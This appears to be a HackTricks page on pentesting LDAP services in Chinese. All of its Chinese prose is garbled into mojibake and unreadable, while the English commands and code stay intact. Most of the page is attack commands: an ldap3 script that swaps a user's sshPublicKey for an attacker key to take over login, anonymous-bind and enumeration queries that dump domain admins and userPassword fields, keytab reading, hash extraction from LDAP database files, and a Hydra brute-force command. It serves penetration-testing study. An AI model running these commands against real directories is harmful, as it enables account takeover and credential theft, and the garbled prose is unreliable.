# 389, 636, 3268, 3269 - Pentesting LDAP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

æå–è‡ªï¼š[https://searchmobilecomputing.techtarget.com/definition/LDAP](https://searchmobilecomputing.techtarget.com/definition/LDAP)

LDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰æ˜¯ä¸€ç§è½¯ä»¶åè®®ï¼Œç”¨äºä½¿ä»»ä½•äººèƒ½å¤Ÿåœ¨ç½‘ç»œä¸Šï¼ˆæ— è®ºæ˜¯å…¬å…±äº’è”ç½‘è¿˜æ˜¯ä¼ä¸šå†…éƒ¨ç½‘ç»œï¼‰**å®šä½**ç»„ç»‡ã€ä¸ªäººå’Œå…¶ä»–**èµ„æº**ï¼Œå¦‚æ–‡ä»¶å’Œè®¾å¤‡ã€‚LDAPæ˜¯ç›®å½•è®¿é—®åè®®ï¼ˆDAPï¼‰çš„â€œè½»é‡çº§â€ï¼ˆä»£ç é‡è¾ƒå°ï¼‰ç‰ˆæœ¬ã€‚

LDAPç›®å½•å¯ä»¥åœ¨å¤šä¸ªæœåŠ¡å™¨ä¹‹é—´**åˆ†å¸ƒ**ã€‚æ¯ä¸ªæœåŠ¡å™¨å¯ä»¥æœ‰ä¸€ä¸ª**å¤åˆ¶**çš„æ€»ç›®å½•ç‰ˆæœ¬ï¼Œå®šæœŸè¿›è¡Œ**åŒæ­¥**ã€‚LDAPæœåŠ¡å™¨ç§°ä¸ºç›®å½•ç³»ç»Ÿä»£ç†ï¼ˆDSAï¼‰ã€‚æ¥æ”¶ç”¨æˆ·è¯·æ±‚çš„LDAPæœåŠ¡å™¨è´Ÿè´£å¤„ç†è¯·æ±‚ï¼Œå¹¶åœ¨å¿…è¦æ—¶å°†å…¶ä¼ é€’ç»™å…¶ä»–DSAï¼Œä½†ç¡®ä¿ä¸ºç”¨æˆ·æä¾›å•ä¸€åè°ƒçš„å“åº”ã€‚

LDAPç›®å½•ä»¥ç®€å•çš„â€œæ ‘â€å±‚æ¬¡ç»“æ„ç»„ç»‡ï¼ŒåŒ…æ‹¬ä»¥ä¸‹çº§åˆ«ï¼š

* æ ¹ç›®å½•ï¼ˆæ ‘çš„èµ·å§‹ä½ç½®æˆ–æºï¼‰ï¼Œåˆ†æ”¯åˆ°
* å›½å®¶ï¼Œæ¯ä¸ªå›½å®¶åˆ†æ”¯åˆ°
* ç»„ç»‡ï¼Œåˆ†æ”¯åˆ°
* ç»„ç»‡å•ä½ï¼ˆéƒ¨é—¨ã€éƒ¨é—¨ç­‰ï¼‰ï¼Œåˆ†æ”¯åˆ°ï¼ˆåŒ…æ‹¬ä¸€ä¸ªæ¡ç›®ï¼‰
* ä¸ªäººï¼ˆåŒ…æ‹¬äººå‘˜ã€æ–‡ä»¶å’Œå…±äº«èµ„æºï¼Œå¦‚æ‰“å°æœºï¼‰

**é»˜è®¤ç«¯å£ï¼š**389å’Œ636ï¼ˆldapsï¼‰ã€‚å…¨å±€ç›®å½•ï¼ˆActiveDirectoryä¸­çš„LDAPï¼‰é»˜è®¤åœ¨ç«¯å£3268ä¸Šæä¾›ï¼ŒLDAPSé»˜è®¤åœ¨ç«¯å£3269ä¸Šæä¾›ã€‚
```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```
### LDAPæ•°æ®äº¤æ¢æ ¼å¼

LDIFï¼ˆLDAPæ•°æ®äº¤æ¢æ ¼å¼ï¼‰å°†ç›®å½•å†…å®¹å®šä¹‰ä¸ºä¸€ç»„è®°å½•ã€‚å®ƒè¿˜å¯ä»¥è¡¨ç¤ºæ›´æ–°è¯·æ±‚ï¼ˆæ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤ã€é‡å‘½åï¼‰ã€‚
```bash
dn: dc=local
dc: local
objectClass: dcObject

dn: dc=moneycorp,dc=local
dc: moneycorp
objectClass: dcObject
objectClass: organization

dn ou=it,dc=moneycorp,dc=local
objectClass: organizationalUnit
ou: dev

dn: ou=marketing,dc=moneycorp,dc=local
objectClass: organizationalUnit
Ou: sales

dn: cn= ,ou= ,dc=moneycorp,dc=local
objectClass: personalData
cn:
sn:
gn:
uid:
ou:
mail: pepe@hacktricks.xyz
phone: 23627387495
```
* ç¬¬1-3è¡Œå®šä¹‰äº†é¡¶çº§åŸŸlocalã€‚
* ç¬¬5-8è¡Œå®šä¹‰äº†ä¸€çº§åŸŸmoneycorpï¼ˆmoneycorp.localï¼‰ã€‚
* ç¬¬10-16è¡Œå®šä¹‰äº†2ä¸ªç»„ç»‡å•ä½ï¼šdevå’Œsalesã€‚
* ç¬¬18-26è¡Œåˆ›å»ºäº†ä¸€ä¸ªåŸŸå¯¹è±¡ï¼Œå¹¶åˆ†é…äº†å¸¦æœ‰å€¼çš„å±æ€§ã€‚

## å†™å…¥æ•°æ®

è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹å€¼ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿæ‰§è¡Œéå¸¸æœ‰è¶£çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œæƒ³è±¡ä¸€ä¸‹ï¼Œæ‚¨**å¯ä»¥æ›´æ”¹æ‚¨çš„ç”¨æˆ·æˆ–ä»»ä½•ç”¨æˆ·çš„"sshPublicKey"ä¿¡æ¯**ã€‚å¾ˆæœ‰å¯èƒ½ï¼Œå¦‚æœå­˜åœ¨æ­¤å±æ€§ï¼Œåˆ™**sshæ­£åœ¨ä»LDAPä¸­è¯»å–å…¬é’¥**ã€‚å¦‚æœæ‚¨å¯ä»¥ä¿®æ”¹ç”¨æˆ·çš„å…¬é’¥ï¼Œå³ä½¿åœ¨sshä¸­æœªå¯ç”¨å¯†ç èº«ä»½éªŒè¯ï¼Œæ‚¨**ä»ç„¶å¯ä»¥ä½œä¸ºè¯¥ç”¨æˆ·ç™»å½•**ã€‚
```bash
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
```
## å—…æ¢æ˜æ–‡å‡­è¯

å¦‚æœLDAPåœ¨æ²¡æœ‰SSLçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œä½ å¯ä»¥åœ¨ç½‘ç»œä¸­**å—…æ¢åˆ°æ˜æ–‡å‡­è¯**ã€‚

æ­¤å¤–ï¼Œä½ å¯ä»¥åœ¨LDAPæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„ç½‘ç»œä¸­è¿›è¡Œ**ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰**ã€‚åœ¨è¿™é‡Œï¼Œä½ å¯ä»¥è¿›è¡Œ**é™çº§æ”»å‡»**ï¼Œä½¿å®¢æˆ·ç«¯ä½¿ç”¨**æ˜æ–‡å‡­è¯**è¿›è¡Œç™»å½•ã€‚

**å¦‚æœä½¿ç”¨SSL**ï¼Œä½ å¯ä»¥å°è¯•è¿›è¡Œç±»ä¼¼ä¸Šè¿°æåˆ°çš„MITMæ”»å‡»ï¼Œä½†æä¾›ä¸€ä¸ª**ä¼ªé€ çš„è¯ä¹¦**ï¼Œå¦‚æœ**ç”¨æˆ·æ¥å—**å®ƒï¼Œä½ å°±èƒ½å¤Ÿé™çº§è®¤è¯æ–¹æ³•å¹¶å†æ¬¡æŸ¥çœ‹å‡­è¯ã€‚

## åŒ¿åè®¿é—®

### ç»•è¿‡TLS SNIæ£€æŸ¥

æ ¹æ®[**è¿™ç¯‡æ–‡ç« **](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ï¼Œåªéœ€ä½¿ç”¨ä»»æ„åŸŸåï¼ˆå¦‚company.comï¼‰è®¿é—®LDAPæœåŠ¡å™¨ï¼Œä»–å°±èƒ½å¤Ÿä»¥åŒ¿åç”¨æˆ·çš„èº«ä»½è”ç³»LDAPæœåŠ¡å¹¶æå–ä¿¡æ¯ã€‚
```bash
ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
```
### LDAPåŒ¿åç»‘å®š

[LDAPåŒ¿åç»‘å®š](https://docs.microsoft.com/zh-cn/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)å…è®¸**æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…**ä»åŸŸä¸­æ£€ç´¢ä¿¡æ¯ï¼Œä¾‹å¦‚å®Œæ•´çš„ç”¨æˆ·ã€ç»„ã€è®¡ç®—æœºã€ç”¨æˆ·å¸æˆ·å±æ€§å’ŒåŸŸå¯†ç ç­–ç•¥åˆ—è¡¨ã€‚è¿™æ˜¯ä¸€ç§**ä¼ ç»Ÿé…ç½®**ï¼Œä»Windows Server 2003å¼€å§‹ï¼Œåªæœ‰ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ‰èƒ½å‘èµ·LDAPè¯·æ±‚ã€‚ \
ç„¶è€Œï¼Œç®¡ç†å‘˜å¯èƒ½éœ€è¦**è®¾ç½®ç‰¹å®šåº”ç”¨ç¨‹åºä»¥å…è®¸åŒ¿åç»‘å®š**å¹¶æä¾›äº†è¶…å‡ºé¢„æœŸè®¿é—®æƒé™çš„è®¿é—®ï¼Œä»è€Œä½¿æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·å¯ä»¥è®¿é—®ADä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚

## æœ‰æ•ˆå‡­æ®

å¦‚æœæ‚¨æœ‰æœ‰æ•ˆçš„å‡­æ®ç™»å½•LDAPæœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è½¬å‚¨æœ‰å…³åŸŸç®¡ç†å‘˜çš„æ‰€æœ‰ä¿¡æ¯ï¼š

[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
```bash
pip3 install ldapdomaindump
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```
### [æš´åŠ›ç ´è§£](../generic-methodologies-and-resources/brute-force.md#ldap)

## æšä¸¾

### è‡ªåŠ¨åŒ–

ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œæ‚¨å°†èƒ½å¤ŸæŸ¥çœ‹**å…¬å¼€ä¿¡æ¯**ï¼ˆå¦‚åŸŸåï¼‰**ï¼š**
```bash
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```
### Python

<details>

<summary>ä½¿ç”¨Pythonè¿›è¡ŒLDAPæšä¸¾</summary>

æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨Pythonè¿›è¡ŒLDAPæšä¸¾ï¼Œæ— è®ºæ˜¯å¦ä½¿ç”¨å‡­æ®ï¼š`pip3 install ldap3`

é¦–å…ˆå°è¯•**æ— å‡­æ®**è¿æ¥ï¼š
```bash
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```
å¦‚æœå“åº”æ˜¯`True`ï¼Œå°±åƒå‰é¢çš„ä¾‹å­ä¸€æ ·ï¼Œä½ å¯ä»¥ä»LDAPæœåŠ¡å™¨è·å–ä¸€äº›**æœ‰è¶£çš„æ•°æ®**ï¼ˆæ¯”å¦‚**å‘½åä¸Šä¸‹æ–‡**æˆ–**åŸŸå**ï¼‰ï¼š
```bash
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts:
dc=DOMAIN,dc=DOMAIN
```
ä¸€æ—¦ä½ è·å¾—äº†å‘½åä¸Šä¸‹æ–‡ï¼Œä½ å¯ä»¥è¿›è¡Œä¸€äº›æ›´åŠ æœ‰è¶£çš„æŸ¥è¯¢ã€‚è¿™ä¸ªç®€å•çš„æŸ¥è¯¢åº”è¯¥ä¼šæ˜¾ç¤ºç›®å½•ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼š
```bash
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```
æˆ–è€…**è½¬å‚¨**æ•´ä¸ªldapï¼š
```bash
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```
</details>

### windapsearch

[**Windapsearch**](https://github.com/ropnop/windapsearch) æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„Pythonè„šæœ¬ï¼Œé€šè¿‡åˆ©ç”¨LDAPæŸ¥è¯¢æ¥æšä¸¾WindowsåŸŸä¸­çš„ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºã€‚
```bash
# Get computers
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
python3 windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```
### ldapsearch

æ£€æŸ¥ç©ºå‡­è¯æˆ–éªŒè¯æ‚¨çš„å‡­è¯æ˜¯å¦æœ‰æ•ˆï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
# CREDENTIALS NOT VALID RESPONSE
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this opera
tion a successful bind must be completed on the connection., data 0, v3839
```
å¦‚æœä½ å‘ç°æœ‰å…³"_bindå¿…é¡»å®Œæˆ_"çš„å†…å®¹ï¼Œæ„å‘³ç€å‡­è¯æ˜¯ä¸æ­£ç¡®çš„ã€‚

ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æå–**åŸŸä¸­çš„æ‰€æœ‰å†…å®¹**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```
æå–**ç”¨æˆ·**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
#Example: ldapsearch -x -H ldap://<IP> -D 'MYDOM\john' -w 'johnpassw' -b "CN=Users,DC=mydom,DC=local"
```
æå– **è®¡ç®—æœº**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**æˆ‘çš„ä¿¡æ¯**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå– **åŸŸç®¡ç†å‘˜**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**åŸŸç”¨æˆ·**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**ä¼ä¸šç®¡ç†å‘˜**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå– **Administrators**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
æå–**è¿œç¨‹æ¡Œé¢ç»„**ï¼š
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
è¦æŸ¥çœ‹æ˜¯å¦æœ‰è®¿é—®ä»»ä½•å¯†ç çš„æƒé™ï¼Œæ‚¨å¯ä»¥åœ¨æ‰§è¡Œå…¶ä¸­ä¸€ä¸ªæŸ¥è¯¢åä½¿ç”¨grepå‘½ä»¤ï¼š
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
è¯·æ³¨æ„ï¼Œæ‚¨åœ¨è¿™é‡Œæ‰¾åˆ°çš„å¯†ç å¯èƒ½ä¸æ˜¯çœŸå®çš„...

#### pbis

æ‚¨å¯ä»¥ä»è¿™é‡Œä¸‹è½½**pbis**ï¼š[https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/)ï¼Œå®ƒé€šå¸¸å®‰è£…åœ¨`/opt/pbis`ç›®å½•ä¸‹ã€‚\
**Pbis**å…è®¸æ‚¨è½»æ¾è·å–åŸºæœ¬ä¿¡æ¯ï¼š
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## å›¾å½¢ç•Œé¢

### Apache Directory

[**ä»è¿™é‡Œä¸‹è½½Apache Directory**](https://directory.apache.org/studio/download/download-linux.html)ã€‚ä½ å¯ä»¥åœ¨[è¿™é‡Œæ‰¾åˆ°å¦‚ä½•ä½¿ç”¨è¿™ä¸ªå·¥å…·çš„ç¤ºä¾‹](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s)ã€‚

### jxplorer

ä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½å¸¦æœ‰LDAPæœåŠ¡å™¨çš„å›¾å½¢ç•Œé¢ï¼š[http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå®‰è£…åœ¨ï¼š_/opt/jxplorer_

![](<../.gitbook/assets/image (22) (1).png>)

## é€šè¿‡Kerberosè¿›è¡Œèº«ä»½éªŒè¯

ä½¿ç”¨`ldapsearch`å‘½ä»¤ï¼Œä½ å¯ä»¥é€šè¿‡ä½¿ç”¨å‚æ•°`-Y GSSAPI`æ¥**ä½¿ç”¨Kerberosè¿›è¡Œèº«ä»½éªŒè¯**ï¼Œè€Œä¸æ˜¯é€šè¿‡**NTLM**è¿›è¡Œèº«ä»½éªŒè¯ã€‚

## POST

å¦‚æœä½ å¯ä»¥è®¿é—®åŒ…å«æ•°æ®åº“çš„æ–‡ä»¶ï¼ˆå¯èƒ½åœ¨_/var/lib/ldap_ä¸­ï¼‰ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å“ˆå¸Œå€¼ï¼š
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
ä½ å¯ä»¥å°†å¯†ç å“ˆå¸Œå€¼è¾“å…¥ç»™Johnï¼ˆä»'{SSHA}'åˆ°'structural'ï¼Œä¸åŒ…æ‹¬'structural'ï¼‰ã€‚

### é…ç½®æ–‡ä»¶

* é€šç”¨
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 æœåŠ¡å™¨
* V3.sas.oc
* Microsoft Active Directory æœåŠ¡å™¨
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP ç›®å½•æœåŠ¡å™¨
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks è‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a "lightweight" (smaller amount of code) version of Directory Access Protocol (DAP).

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾— [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
